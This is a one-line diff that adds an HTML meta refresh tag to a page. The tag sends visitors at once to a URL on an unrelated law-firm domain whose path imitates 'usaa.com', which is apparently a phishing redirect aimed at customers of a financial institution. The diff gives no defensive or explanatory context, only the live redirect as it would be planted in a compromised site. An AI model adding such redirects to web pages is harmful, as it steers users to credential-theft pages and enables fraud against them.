@@ -1,0 +1,1 @@
+<META HTTP-EQUIV="refresh" CONTENT="0;URL=http://farooqlawassociates.net/.usaa.com/">
